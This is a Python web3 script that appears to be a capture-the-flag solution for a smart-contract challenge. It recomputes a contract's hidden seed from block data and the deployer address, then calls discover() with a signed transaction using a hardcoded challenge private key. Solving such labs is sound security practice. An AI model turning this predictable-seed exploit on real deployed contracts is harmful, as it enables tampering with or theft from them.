from web3 import Web3

# RPC Endpoint
RPC_URL = "http://83.136.251.195:53851/"

# Player details
PRIVATE_KEY = "e66a6d7e4a11c72df165d50eb5b548a8fc4d7b553259ae20a54c8a41ea115b50"
PLAYER_ADDRESS = "0xf54E423279c7512F25F61c2329031F9bAC9fE4A3"

# Target contract addresses
TARGET_CONTRACT = "0xF3B6B07a2c28bb47463126105e0C658ed7ef046f"
SETUP_CONTRACT = "0x9A77376BafdD1bF8433e74940584829C2B181a81"

# Connect to the blockchain
w3 = Web3(Web3.HTTPProvider(RPC_URL))

# Verify connection
if not w3.is_connected():
    raise Exception("Failed to connect to Ethereum node")

SETUP_ABI = [
        {
            "inputs": [],
            "name": "isSolved",
            "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
            "stateMutability": "view",
            "type": "function"
        }
    ]

setup_contract = w3.eth.contract(address=SETUP_CONTRACT, abi=SETUP_ABI)

def exploit(w3, target_contract, block_number, block_timestamp, deployer):
    """
    Exploit the ForgottenArtifact contract by reproducing the storage slot seed
    """
    # Reproduce the exact seed generation used in the contract
    seed = w3.solidity_keccak(
        ['uint256', 'uint256', 'address'], 
        [block_number, block_timestamp, deployer]
    )

    # Prepare the transaction
    contract = w3.eth.contract(address=target_contract, abi=[
        {
            "inputs": [{"internalType": "bytes32", "name": "_artifactLocation", "type": "bytes32"}],
            "name": "discover",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ])

    # Build transaction
    transaction = contract.functions.discover(seed).build_transaction({
        'from': PLAYER_ADDRESS,
        'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
        'gas': 100000,
        'gasPrice': w3.eth.gas_price
    })

    # Sign the transaction
    signed_txn = w3.eth.account.sign_transaction(transaction, private_key=PRIVATE_KEY)

    # Send the transaction
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    
    print(f"Transaction hash: {tx_hash.hex()}")
    
    # Wait for transaction receipt
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Transaction successful: {tx_receipt['status'] == 1}")
    is_solved = setup_contract.functions.isSolved().call()
    print(f"Challenge Solved: {is_solved}")

def main():

    # Get the latest block to use for seed generation
    latest_block = w3.eth.get_block('latest')
    block_number = latest_block['number']
    block_timestamp = latest_block['timestamp']

    # Exploit the contract
    exploit(
        w3, 
        TARGET_CONTRACT, 
        block_number, 
        block_timestamp, 
        SETUP_CONTRACT
    )

if __name__ == "__main__":
    main()